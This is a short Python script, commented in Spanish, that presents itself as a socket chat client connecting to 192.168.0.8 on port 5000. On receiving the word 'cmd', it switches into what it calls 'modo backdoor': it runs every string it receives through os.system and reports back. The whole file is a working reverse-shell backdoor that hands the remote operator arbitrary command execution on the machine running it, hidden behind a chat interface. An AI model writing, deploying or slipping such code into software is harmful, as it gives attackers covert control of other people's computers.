#-*-coding: utf-8-*-
from socket import * 
from os import system, getcwd
if __name__ == '__main__':
	sock = socket(AF_INET, SOCK_STREAM)
	sock.connect(("192.168.0.8",5000))
	while True:
		mensaje = input(">")
		sock.send(mensaje.encode())
		resp = sock.recv(1024).decode()
		if resp == "cmd":
			sock.send("Se ha iniciado el modo backdoor, para salir escriba:\n'exit-cmd'.\n{}".format(getcwd()).encode())
			while resp != "exit-cmd":
				resp = sock.recv(1024).decode()
				try:
					system(resp)
				except:
					sock.send("No se ha podido ejecutar el comando el comando.".encode())
				else:
					sock.send("Comando ejecutado correctamente.".encode())
			sock.send("Se ha cerrado el modo backdoor.".encode())

		else:
			print("amigo>{}".format(resp))